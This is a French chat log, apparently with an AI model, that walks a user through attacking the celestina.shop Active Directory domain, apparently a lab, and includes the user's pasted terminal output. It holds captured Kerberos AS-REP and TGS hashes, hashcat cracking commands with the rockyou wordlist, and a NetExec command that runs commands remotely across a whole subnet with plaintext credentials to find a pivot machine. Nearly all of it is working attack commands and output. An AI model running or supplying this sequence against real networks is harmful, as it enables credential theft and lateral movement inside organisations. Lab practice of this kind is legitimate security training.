$krb5asrep$23$j.vabre@CELESTINA.SHOP:8fa9ef862ba9e1f2783ce8681dbb6d29$cf51843d873e6971adb0ae7cb3bddf5e7bdfa1a4eb08805c61e17faccf7f46acc1c9fe3e49c47e1b830c2bb29f7c53c5c8495bf455f4f4c245b20b9a6c81d2502d7538bd45baccda5e7e69e9fec8c2d13dbd16f99c36d115e071d1a246259139b8f35500404790551f17ace9e0c14aabecbc653a8e696e65d8cbe1e2c6e3e7b5ad00c97a9821ec6692fdc3a647237fcaef0935f05528bdcf3b400d940e6cef78762e6a8d8943b95cdc2dfe2ed3469059519ba44bab042dd2e76f1d37b9882c3d16d0f6c1527df002296441b6f658432480ac733c0bcd1923cb05afbbd0e712ab8afad9f90c073d1926f88284f4ae3c95
EOF
Étape 2 : Casser le mot de passe de j.vabre
On lance Hashcat avec le dictionnaire rockyou.txt (qui se trouve dans /opt/wordlists/ sur Exegol).

Bash
hashcat -m 18200 asrep.txt /opt/wordlists/rockyou.txt
Étape 3 : Sauvegarder les hashs de g.clooney et k.cedepte
Même principe, copie-colle ce bloc entier pour créer le fichier tgs.txt avec tes deux autres hashs.

Bash
cat << 'EOF' > tgs.txt
$krb5tgs$23$*g.clooney$CELESTINA.SHOP$celestina.shop/g.clooney*$c1ebab681ddf08c95c154ac12c179104$480611136c3bd296a07674f079d4162618ad52a4442965e1b69b557e63f6a551ad61020d3eacb6df5e07516991a6465dca4c0926ddbb2485431ad531668ccfceec535d8ca08def1d3c879085f856e00177e1bfbb516b38c06ba450a3fede30262504b4949ca0b022a78c6ab5214012267aaba862c8b88a6eef92dde803e32801bb5cbd7938ff4d74459cd66456638e189073f6d7570d27a1825b7ac9dac3ca7e5c6c3775befa4b8f0647a0944d4b6fb1913e7af890c42204943c1c86c89e7821c59d12987920158df97c8bf63bc1fdd722822f46db796a816956893b4113acc537d1483868bd7a1e2badaa03a80caa0a12a5775d0a288c0b778aea3e65f4c95004aa7bfb7b35390817908923b31110166251756afa047793f61cfc2213ae7204aac87825bb29919460d4107476f3435f1a4fe0bb0b8aa254024d58070021950240d6997797c0989c38c1deb469a63e6cebe09d8ea7313270b76f3af8aa1017d652f0921464b2385c791bdd0c87a15f036be76ac39a4f9259392a12b2d06fbdcc8f49795ef5e4787e40b03b0db2a991538b385d06601bb1b05dc4c550ef6b3c02935eb21ce76b066fddbe43c3d67adf4128aa4150be54159ce4d391a48171f0f3b06eb8166ea22bf9f8a1bd2b353963effb59a388f914bf6c39aae4d3c3d8d6c3aa79930fd9cf36a3f4f98e5ff2b1bfe06b61e60189dd40818186bcfec8c747f806c14441e73f0a6f9dd00954779ec87429256218e0e6221a01a2365aadcf723a7c8015f8e3c18622652decefb5b015b6a8d57bcdd6059376e77460a03dae405380523f1bd273cea25223e110b4ee8515e375959e543d7e3eba59acbd2a3211781566707f820083ae92bb4cdc04585851b51b04cc7fb80381bfcb2aaa805fb273453111e12d1802d1ed5c8228e1254ae385ae0fc8315ddb633cf10db12564aaeadd88ae4e9154c551fc7c387df63dc010500460f5d19dc4eb5ae080445ca06d6356b32706dc710705bfb2f1999a62e2e400c0746f59448212b41b253062381d8d460162d060c3ca3ce4a04af2e6403eece8cc4ac3a0b691257ccd135e257877d5c7c9a1b34d74a5ef76aba6e7ebbb2f25708939b1c1be23b0f143ecc3fe945b425861e0adf3e5060115bd76a9d85d3617910782c6f29f15366b79519f45863c919ef05c9e678a1fcd89043aae57b35abb27ae466f76c5fc0da2db5292868fbd744fe29280995d584072ea5744c955f8c502ac2d5da752106b4660409887d12c511f23f9e56cba69b9c3516e4216a5da9bb36f9e33d88515efa95f3cbe99631605aa0dd0cb39f7e6a44c77be32ff52810c8c787eeaded8c643ea8458b70d980afdb33bc703c63937eec87bd5ffb2299794981c224ba35265c1a96a96128abe2c34a5b14183b84c78115eb0df092c46ce66888333b4fc0e0faf8763700516287f0419563f0602407fe626c36257ce30a385edc330bdd7db0c23
$krb5tgs$23$*k.cedepte$CELESTINA.SHOP$celestina.shop/k.cedepte*$3e49f7cdfb92c518ebe776c8ff50a0c8$2a19024f0225e4e8f99109c66f7a98b28129a381663f43608301cc384d7b18af76bf1cfd828c4cdd300cd3b159d88243b55699a2a04cdd41991a144436c30727727bdf5e1ad1039e2d77158935a1673f897d09ac52a609cf0b7e775a389016985a10f589661d749f40511e138328fecd19fb66fe496e4c6c361c1c6172e9a0176051a412d101fbbf4225cf845399fc3077d85f8b38e28adc9895bd538dcbb89f787223b6f6270899eb84bfcc3fa5dda7ccd990a42ac30391009baca3769c62abeca891174f74a5fccdaba4539d41a41dcb4d5571ee44d8cdbd67bd4f5ff705722fcf43dec7e58dfb61c2a7e3d5279a81c33aef947f9b687b09aee8dbcb890b946598b4928e5e4324a6d6fa87caa94edec189f0c9418cd268b07b376f177f81fe01780a4a73b71f68d599d310de3704885c4df4b6c4ca382488ab2e9e62333dcda28ef4d35ff93117791ea54bc1b71c604a164e1b9c4ddf7c2643f2eb9d0ece7758a1d58d0ef6e02bbd3ddc1f4ef59932fff4c22b241f54e32985d853c649dd83dda544c46c3b00e085a6fddbcc0136ac00e42977b124c66d4288e29f7ac26cffd6c7958f5b55c94dbb779c3d49e589400c1b65f26eb01801d4bdac770ba28c81d118e208aa9a978f841f97135fa4713f1968d4f42b57d01aed29924be6e0916962fd0afb70c76f6765df89ce13ee5b67abac0f21fbe86742963be4951556dad742bc8557186a1dda725ab00e2707b101b623bc62d906a9e7706a210b4d4a88d30487257d4323bc372c39eb8f9c9058e2c8aebedd3a15164027d54e85ea2125a19be3422967481bfc8e28a837494863ca7aca1638dde55934ba1d12caf7646a810116e017f31de3fa106b7b330b0f8d3e2c2450a6075d4e3d7a017ce16b29420c45cdd072dc8091c5d0a773e98e4ef44eaaa29962e37dbab5e5d178ee610c370b8dc7cd5747e6e2cc50219063a925d1ff0a0a7d4a516003d41c74939b68a065423436be992406ab8052b3472c76c4592ef96f1628696311077692ba512ebcee51f8de70c65e033a6c274efbffd3223d9867514f7866ab54f87253207660d69ca56fce83a9f08529d1621032191d84efc572352b6921d441e0aaa93110608310db2af9b686b498ac5ef7efa85883e56af499d58e2eaf020dd3fbb16666673f1b7e6bd64e57a7920e99c00e4adca9a39dc0d21c88d582735ce429dbf45b9211845623dd4787af43465107cfb66e434caa172df112dba141b92c903ef4dacd3b8eaab40ac264728d68da975a9100585bcce75ce2890a149036a8e608029c865623bb0171497c3af75bab1f60b097b7b7ce343b2f01c96a37dbbfa455ee6719d7241cf4897767e6873e19e822e84389c4205a79f4cbd9ce67cfa694e5a988692d6a2efd05d7dfc18d7998673e16cd902803e1cb21983544cb304ddecc0626bd73ce143e90d66ef63ab601d9a3e0aa1149fabee0ffec12fac3a229
EOF
Étape 4 : Casser les mots de passe de g.clooney et k.cedepte
On relance Hashcat avec le mode 13100 pour ces deux là.

Bash
hashcat -m 13100 tgs.txt /opt/wordlists/rockyou.txt
Étape 5 : Trouver la machine passerelle (le "Pivot")
Pendant que ça cracke, on demande à NetExec d'aller exécuter silencieusement la commande ipconfig sur toutes les machines du réseau.

Bash
nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' -x 'ipconfig'
Quand cette commande aura terminé de défiler, regarde bien les résultats : il y aura une machine qui affichera une adresse IP en 10.37.13.X !

[May 18, 2026 - 09:33:52 (CEST)] exegol-free /workspace # cat << 'EOF' > asrep.txt

$krb5asrep$23$j.vabre@CELESTINA.SHOP:8fa9ef862ba9e1f2783ce8681dbb6d29$cf51843d873e6971adb0ae7cb3bddf5e7bdfa1a4eb08805c61e17faccf7f46acc1c9fe3e49c47e1b830c2bb29f7c53c5c8495bf455f4f4c245b20b9a6c81d2502d7538bd45baccda5e7e69e9fec8c2d13dbd16f99c36d115e071d1a246259139b8f35500404790551f17ace9e0c14aabecbc653a8e696e65d8cbe1e2c6e3e7b5ad00c97a9821ec6692fdc3a647237fcaef0935f05528bdcf3b400d940e6cef78762e6a8d8943b95cdc2dfe2ed3469059519ba44bab042dd2e76f1d37b9882c3d16d0f6c1527df002296441b6f658432480ac733c0bcd1923cb05afbbd0e712ab8afad9f90c073d1926f88284f4ae3c95

EOF

[May 18, 2026 - 09:35:54 (CEST)] exegol-free /workspace # hashcat -m 18200 asrep.txt /opt/wordlists/rockyou.txt

hashcat (v6.2.6) starting



/opt/wordlists/rockyou.txt: No such file or directory



Started: Mon May 18 09:36:01 2026

Stopped: Mon May 18 09:36:02 2026

[May 18, 2026 - 09:36:02 (CEST)] exegol-free /workspace # ls

20260518092435_computers.json   20260518092435_domains.json  20260518092435_groups.json  20260518092435_users.json

20260518092435_containers.json  20260518092435_gpos.json     20260518092435_ous.json     asrep.txt

[May 18, 2026 - 09:36:05 (CEST)] exegol-free /workspace # 

Ah, le grand classique ! Pour économiser de l'espace, les distributions de pentest (comme Kali ou Exegol) compressent très souvent le fichier rockyou.txt ou le rangent dans un autre dossier.

Voici comment régler ça en deux secondes directement dans ton dossier /workspace.

Étape 2.1 : Récupérer rockyou.txt
Copie-colle cette commande. Elle va chercher la version compressée native du système et l'extraire dans ton dossier actuel (et si elle ne la trouve pas, elle la téléchargera directement depuis internet !) :

Bash
gunzip -c /usr/share/wordlists/rockyou.txt.gz > rockyou.txt 2>/dev/null || wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
Étape 2.2 : Relancer Hashcat (pour j.vabre)
Maintenant que rockyou.txt est juste à côté de ton fichier asrep.txt, relance la commande comme ceci :

Bash
hashcat -m 18200 asrep.txt rockyou.txt
Pendant que ça tourne, tu peux enchaîner avec les blocs de l'étape précédente pour les autres comptes :

Étape 3 : Sauvegarder les hashs de g.clooney et k.cedepte
Bash
cat << 'EOF' > tgs.txt
$krb5tgs$23$*g.clooney$CELESTINA.SHOP$celestina.shop/g.clooney*$c1ebab681ddf08c95c154ac12c179104$480611136c3bd296a07674f079d4162618ad52a4442965e1b69b557e63f6a551ad61020d3eacb6df5e07516991a6465dca4c0926ddbb2485431ad531668ccfceec535d8ca08def1d3c879085f856e00177e1bfbb516b38c06ba450a3fede30262504b4949ca0b022a78c6ab5214012267aaba862c8b88a6eef92dde803e32801bb5cbd7938ff4d74459cd66456638e189073f6d7570d27a1825b7ac9dac3ca7e5c6c3775befa4b8f0647a0944d4b6fb1913e7af890c42204943c1c86c89e7821c59d12987920158df97c8bf63bc1fdd722822f46db796a816956893b4113acc537d1483868bd7a1e2badaa03a80caa0a12a5775d0a288c0b778aea3e65f4c95004aa7bfb7b35390817908923b31110166251756afa047793f61cfc2213ae7204aac87825bb29919460d4107476f3435f1a4fe0bb0b8aa254024d58070021950240d6997797c0989c38c1deb469a63e6cebe09d8ea7313270b76f3af8aa1017d652f0921464b2385c791bdd0c87a15f036be76ac39a4f9259392a12b2d06fbdcc8f49795ef5e4787e40b03b0db2a991538b385d06601bb1b05dc4c550ef6b3c02935eb21ce76b066fddbe43c3d67adf4128aa4150be54159ce4d391a48171f0f3b06eb8166ea22bf9f8a1bd2b353963effb59a388f914bf6c39aae4d3c3d8d6c3aa79930fd9cf36a3f4f98e5ff2b1bfe06b61e60189dd40818186bcfec8c747f806c14441e73f0a6f9dd00954779ec87429256218e0e6221a01a2365aadcf723a7c8015f8e3c18622652decefb5b015b6a8d57bcdd6059376e77460a03dae405380523f1bd273cea25223e110b4ee8515e375959e543d7e3eba59acbd2a3211781566707f820083ae92bb4cdc04585851b51b04cc7fb80381bfcb2aaa805fb273453111e12d1802d1ed5c8228e1254ae385ae0fc8315ddb633cf10db12564aaeadd88ae4e9154c551fc7c387df63dc010500460f5d19dc4eb5ae080445ca06d6356b32706dc710705bfb2f1999a62e2e400c0746f59448212b41b253062381d8d460162d060c3ca3ce4a04af2e6403eece8cc4ac3a0b691257ccd135e257877d5c7c9a1b34d74a5ef76aba6e7ebbb2f25708939b1c1be23b0f143ecc3fe945b425861e0adf3e5060115bd76a9d85d3617910782c6f29f15366b79519f45863c919ef05c9e678a1fcd89043aae57b35abb27ae466f76c5fc0da2db5292868fbd744fe29280995d584072ea5744c955f8c502ac2d5da752106b4660409887d12c511f23f9e56cba69b9c3516e4216a5da9bb36f9e33d88515efa95f3cbe99631605aa0dd0cb39f7e6a44c77be32ff52810c8c787eeaded8c643ea8458b70d980afdb33bc703c63937eec87bd5ffb2299794981c224ba35265c1a96a96128abe2c34a5b14183b84c78115eb0df092c46ce66888333b4fc0e0faf8763700516287f0419563f0602407fe626c36257ce30a385edc330bdd7db0c23
$krb5tgs$23$*k.cedepte$CELESTINA.SHOP$celestina.shop/k.cedepte*$3e49f7cdfb92c518ebe776c8ff50a0c8$2a19024f0225e4e8f99109c66f7a98b28129a381663f43608301cc384d7b18af76bf1cfd828c4cdd300cd3b159d88243b55699a2a04cdd41991a144436c30727727bdf5e1ad1039e2d77158935a1673f897d09ac52a609cf0b7e775a389016985a10f589661d749f40511e138328fecd19fb66fe496e4c6c361c1c6172e9a0176051a412d101fbbf4225cf845399fc3077d85f8b38e28adc9895bd538dcbb89f787223b6f6270899eb84bfcc3fa5dda7ccd990a42ac30391009baca3769c62abeca891174f74a5fccdaba4539d41a41dcb4d5571ee44d8cdbd67bd4f5ff705722fcf43dec7e58dfb61c2a7e3d5279a81c33aef947f9b687b09aee8dbcb890b946598b4928e5e4324a6d6fa87caa94edec189f0c9418cd268b07b376f177f81fe01780a4a73b71f68d599d310de3704885c4df4b6c4ca382488ab2e9e62333dcda28ef4d35ff93117791ea54bc1b71c604a164e1b9c4ddf7c2643f2eb9d0ece7758a1d58d0ef6e02bbd3ddc1f4ef59932fff4c22b241f54e32985d853c649dd83dda544c46c3b00e085a6fddbcc0136ac00e42977b124c66d4288e29f7ac26cffd6c7958f5b55c94dbb779c3d49e589400c1b65f26eb01801d4bdac770ba28c81d118e208aa9a978f841f97135fa4713f1968d4f42b57d01aed29924be6e0916962fd0afb70c76f6765df89ce13ee5b67abac0f21fbe86742963be4951556dad742bc8557186a1dda725ab00e2707b101b623bc62d906a9e7706a210b4d4a88d30487257d4323bc372c39eb8f9c9058e2c8aebedd3a15164027d54e85ea2125a19be3422967481bfc8e28a837494863ca7aca1638dde55934ba1d12caf7646a810116e017f31de3fa106b7b330b0f8d3e2c2450a6075d4e3d7a017ce16b29420c45cdd072dc8091c5d0a773e98e4ef44eaaa29962e37dbab5e5d178ee610c370b8dc7cd5747e6e2cc50219063a925d1ff0a0a7d4a516003d41c74939b68a065423436be992406ab8052b3472c76c4592ef96f1628696311077692ba512ebcee51f8de70c65e033a6c274efbffd3223d9867514f7866ab54f87253207660d69ca56fce83a9f08529d1621032191d84efc572352b6921d441e0aaa93110608310db2af9b686b498ac5ef7efa85883e56af499d58e2eaf020dd3fbb16666673f1b7e6bd64e57a7920e99c00e4adca9a39dc0d21c88d582735ce429dbf45b9211845623dd4787af43465107cfb66e434caa172df112dba141b92c903ef4dacd3b8eaab40ac264728d68da975a9100585bcce75ce2890a149036a8e608029c865623bb0171497c3af75bab1f60b097b7b7ce343b2f01c96a37dbbfa455ee6719d7241cf4897767e6873e19e822e84389c4205a79f4cbd9ce67cfa694e5a988692d6a2efd05d7dfc18d7998673e16cd902803e1cb21983544cb304ddecc0626bd73ce143e90d66ef63ab601d9a3e0aa1149fabee0ffec12fac3a229
EOF
Étape 4 : Casser les mots de passe de g.clooney et k.cedepte
Bash
hashcat -m 13100 tgs.txt rockyou.txt
Étape 5 : Trouver la machine passerelle (le "Pivot")
Ouvre un autre onglet dans ton terminal Exegol ou attends la fin de Hashcat, puis lance cette recherche globale sur le réseau pour repérer la machine avec l'IP en .13. cachée :

Bash
nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' -x 'ipconfig'
[May 18, 2026 - 09:36:02 (CEST)] exegol-free /workspace # ls

20260518092435_computers.json   20260518092435_domains.json  20260518092435_groups.json  20260518092435_users.json

20260518092435_containers.json  20260518092435_gpos.json     20260518092435_ous.json     asrep.txt

[May 18, 2026 - 09:36:05 (CEST)] exegol-free /workspace # gunzip -c /usr/share/wordlists/rockyou.txt.gz > rockyou.txt 2>/dev/null || wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

--2026-05-18 09:37:07--  https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

Resolving github.com (github.com)... 140.82.121.4

Connecting to github.com (github.com)|140.82.121.4|:443... connected.

HTTP request sent, awaiting response... 302 Found

Location: https://release-assets.githubusercontent.com/github-production-release-asset/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-18T08%3A22%3A21Z&rscd=attachment%3B+filename%3Drockyou.txt&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-18T07%3A22%3A16Z&ske=2026-05-18T08%3A22%3A21Z&sks=b&skv=2018-11-09&sig=VEMSfmGzEjNE8veiSTjXGXQMggj7NPderWU%2FBUWpwKM%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3OTA5MzQyNywibmJmIjoxNzc5MDg5ODI3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.Tu-OyaB8VwpNXvYKKvjISs7ZVRIRfYR1rAhV7-pGhUw&response-content-disposition=attachment%3B%20filename%3Drockyou.txt&response-content-type=application%2Foctet-stream [following]

--2026-05-18 09:37:07--  https://release-assets.githubusercontent.com/github-production-release-asset/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-18T08%3A22%3A21Z&rscd=attachment%3B+filename%3Drockyou.txt&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-18T07%3A22%3A16Z&ske=2026-05-18T08%3A22%3A21Z&sks=b&skv=2018-11-09&sig=VEMSfmGzEjNE8veiSTjXGXQMggj7NPderWU%2FBUWpwKM%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3OTA5MzQyNywibmJmIjoxNzc5MDg5ODI3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.Tu-OyaB8VwpNXvYKKvjISs7ZVRIRfYR1rAhV7-pGhUw&response-content-disposition=attachment%3B%20filename%3Drockyou.txt&response-content-type=application%2Foctet-stream

Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...

Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.

HTTP request sent, awaiting response... 200 OK

Length: 139921497 (133M) [application/octet-stream]

Saving to: ‘rockyou.txt.1’



rockyou.txt.1                                      100%[==============================================================================================================>] 133.44M  3.98MB/s    in 29s     



2026-05-18 09:37:40 (4.64 MB/s) - ‘rockyou.txt.1’ saved [139921497/139921497]



[May 18, 2026 - 09:37:40 (CEST)] exegol-free /workspace # hashcat -m 18200 asrep.txt rockyou.txt

hashcat (v6.2.6) starting



OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]

==========================================================================================================================================

* Device #1: pthread--0x000, 1443/2950 MB (512 MB allocatable), 4MCU



Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256



Hashes: 1 digests; 1 unique digests, 1 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1



Optimizers applied:

* Zero-Byte

* Not-Iterated

* Single-Hash

* Single-Salt



ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.



Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.



Host memory required for this attack: 0 MB



The wordlist or mask that you are using is too small.

This means that hashcat cannot use the full parallel power of your device(s).

Unless you supply more work, your cracking speed will drop.

For tips on supplying more work, see: https://hashcat.net/faq/morework



Approaching final keyspace - workload adjusted.           



Session..........: hashcat                                

Status...........: Exhausted

Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)

Hash.Target......: $krb5asrep$23$j.vabre@CELESTINA.SHOP:8fa9ef862ba9e1...ae3c95

Time.Started.....: Mon May 18 09:38:07 2026 (0 secs)

Time.Estimated...: Mon May 18 09:38:07 2026 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:        0 H/s (0.00ms) @ Accel:256 Loops:1 Thr:1 Vec:4

Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)

Progress.........: 0

Rejected.........: 0

Restore.Point....: 0

Restore.Sub.#1...: Salt:0 Amplifier:0-0 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: [Copying]



Started: Mon May 18 09:37:50 2026

Stopped: Mon May 18 09:38:08 2026

[May 18, 2026 - 09:38:08 (CEST)] exegol-free /workspace # cat << 'EOF' > tgs.txt

$krb5tgs$23$*g.clooney$CELESTINA.SHOP$celestina.shop/g.clooney*$c1ebab681ddf08c95c154ac12c179104$480611136c3bd296a07674f079d4162618ad52a4442965e1b69b557e63f6a551ad61020d3eacb6df5e07516991a6465dca4c0926ddbb2485431ad531668ccfceec535d8ca08def1d3c879085f856e00177e1bfbb516b38c06ba450a3fede30262504b4949ca0b022a78c6ab5214012267aaba862c8b88a6eef92dde803e32801bb5cbd7938ff4d74459cd66456638e189073f6d7570d27a1825b7ac9dac3ca7e5c6c3775befa4b8f0647a0944d4b6fb1913e7af890c42204943c1c86c89e7821c59d12987920158df97c8bf63bc1fdd722822f46db796a816956893b4113acc537d1483868bd7a1e2badaa03a80caa0a12a5775d0a288c0b778aea3e65f4c95004aa7bfb7b35390817908923b31110166251756afa047793f61cfc2213ae7204aac87825bb29919460d4107476f3435f1a4fe0bb0b8aa254024d58070021950240d6997797c0989c38c1deb469a63e6cebe09d8ea7313270b76f3af8aa1017d652f0921464b2385c791bdd0c87a15f036be76ac39a4f9259392a12b2d06fbdcc8f49795ef5e4787e40b03b0db2a991538b385d06601bb1b05dc4c550ef6b3c02935eb21ce76b066fddbe43c3d67adf4128aa4150be54159ce4d391a48171f0f3b06eb8166ea22bf9f8a1bd2b353963effb59a388f914bf6c39aae4d3c3d8d6c3aa79930fd9cf36a3f4f98e5ff2b1bfe06b61e60189dd40818186bcfec8c747f806c14441e73f0a6f9dd00954779ec87429256218e0e6221a01a2365aadcf723a7c8015f8e3c18622652decefb5b015b6a8d57bcdd6059376e77460a03dae405380523f1bd273cea25223e110b4ee8515e375959e543d7e3eba59acbd2a3211781566707f820083ae92bb4cdc04585851b51b04cc7fb80381bfcb2aaa805fb273453111e12d1802d1ed5c8228e1254ae385ae0fc8315ddb633cf10db12564aaeadd88ae4e9154c551fc7c387df63dc010500460f5d19dc4eb5ae080445ca06d6356b32706dc710705bfb2f1999a62e2e400c0746f59448212b41b253062381d8d460162d060c3ca3ce4a04af2e6403eece8cc4ac3a0b691257ccd135e257877d5c7c9a1b34d74a5ef76aba6e7ebbb2f25708939b1c1be23b0f143ecc3fe945b425861e0adf3e5060115bd76a9d85d3617910782c6f29f15366b79519f45863c919ef05c9e678a1fcd89043aae57b35abb27ae466f76c5fc0da2db5292868fbd744fe29280995d584072ea5744c955f8c502ac2d5da752106b4660409887d12c511f23f9e56cba69b9c3516e4216a5da9bb36f9e33d88515efa95f3cbe99631605aa0dd0cb39f7e6a44c77be32ff52810c8c787eeaded8c643ea8458b70d980afdb33bc703c63937eec87bd5ffb2299794981c224ba35265c1a96a96128abe2c34a5b14183b84c78115eb0df092c46ce66888333b4fc0e0faf8763700516287f0419563f0602407fe626c36257ce30a385edc330bdd7db0c23

$krb5tgs$23$*k.cedepte$CELESTINA.SHOP$celestina.shop/k.cedepte*$3e49f7cdfb92c518ebe776c8ff50a0c8$2a19024f0225e4e8f99109c66f7a98b28129a381663f43608301cc384d7b18af76bf1cfd828c4cdd300cd3b159d88243b55699a2a04cdd41991a144436c30727727bdf5e1ad1039e2d77158935a1673f897d09ac52a609cf0b7e775a389016985a10f589661d749f40511e138328fecd19fb66fe496e4c6c361c1c6172e9a0176051a412d101fbbf4225cf845399fc3077d85f8b38e28adc9895bd538dcbb89f787223b6f6270899eb84bfcc3fa5dda7ccd990a42ac30391009baca3769c62abeca891174f74a5fccdaba4539d41a41dcb4d5571ee44d8cdbd67bd4f5ff705722fcf43dec7e58dfb61c2a7e3d5279a81c33aef947f9b687b09aee8dbcb890b946598b4928e5e4324a6d6fa87caa94edec189f0c9418cd268b07b376f177f81fe01780a4a73b71f68d599d310de3704885c4df4b6c4ca382488ab2e9e62333dcda28ef4d35ff93117791ea54bc1b71c604a164e1b9c4ddf7c2643f2eb9d0ece7758a1d58d0ef6e02bbd3ddc1f4ef59932fff4c22b241f54e32985d853c649dd83dda544c46c3b00e085a6fddbcc0136ac00e42977b124c66d4288e29f7ac26cffd6c7958f5b55c94dbb779c3d49e589400c1b65f26eb01801d4bdac770ba28c81d118e208aa9a978f841f97135fa4713f1968d4f42b57d01aed29924be6e0916962fd0afb70c76f6765df89ce13ee5b67abac0f21fbe86742963be4951556dad742bc8557186a1dda725ab00e2707b101b623bc62d906a9e7706a210b4d4a88d30487257d4323bc372c39eb8f9c9058e2c8aebedd3a15164027d54e85ea2125a19be3422967481bfc8e28a837494863ca7aca1638dde55934ba1d12caf7646a810116e017f31de3fa106b7b330b0f8d3e2c2450a6075d4e3d7a017ce16b29420c45cdd072dc8091c5d0a773e98e4ef44eaaa29962e37dbab5e5d178ee610c370b8dc7cd5747e6e2cc50219063a925d1ff0a0a7d4a516003d41c74939b68a065423436be992406ab8052b3472c76c4592ef96f1628696311077692ba512ebcee51f8de70c65e033a6c274efbffd3223d9867514f7866ab54f87253207660d69ca56fce83a9f08529d1621032191d84efc572352b6921d441e0aaa93110608310db2af9b686b498ac5ef7efa85883e56af499d58e2eaf020dd3fbb16666673f1b7e6bd64e57a7920e99c00e4adca9a39dc0d21c88d582735ce429dbf45b9211845623dd4787af43465107cfb66e434caa172df112dba141b92c903ef4dacd3b8eaab40ac264728d68da975a9100585bcce75ce2890a149036a8e608029c865623bb0171497c3af75bab1f60b097b7b7ce343b2f01c96a37dbbfa455ee6719d7241cf4897767e6873e19e822e84389c4205a79f4cbd9ce67cfa694e5a988692d6a2efd05d7dfc18d7998673e16cd902803e1cb21983544cb304ddecc0626bd73ce143e90d66ef63ab601d9a3e0aa1149fabee0ffec12fac3a229

EOF

[May 18, 2026 - 09:38:13 (CEST)] exegol-free /workspace # hashcat -m 13100 tgs.txt rockyou.txt

hashcat (v6.2.6) starting



OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]

==========================================================================================================================================

* Device #1: pthread--0x000, 1443/2950 MB (512 MB allocatable), 4MCU



Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256



Hashes: 2 digests; 2 unique digests, 2 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1



Optimizers applied:

* Zero-Byte

* Not-Iterated



ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.



Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.



Host memory required for this attack: 0 MB



The wordlist or mask that you are using is too small.

This means that hashcat cannot use the full parallel power of your device(s).

Unless you supply more work, your cracking speed will drop.

For tips on supplying more work, see: https://hashcat.net/faq/morework



Approaching final keyspace - workload adjusted.           



Session..........: hashcat                                

Status...........: Exhausted

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: tgs.txt

Time.Started.....: Mon May 18 09:38:32 2026 (0 secs)

Time.Estimated...: Mon May 18 09:38:32 2026 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:        0 H/s (0.00ms) @ Accel:256 Loops:1 Thr:1 Vec:4

Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts

Progress.........: 0

Rejected.........: 0

Restore.Point....: 0

Restore.Sub.#1...: Salt:0 Amplifier:0-0 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: [Copying]



Started: Mon May 18 09:38:22 2026

Stopped: Mon May 18 09:38:33 2026

[May 18, 2026 - 09:38:33 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' -x 'ipconfig'

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

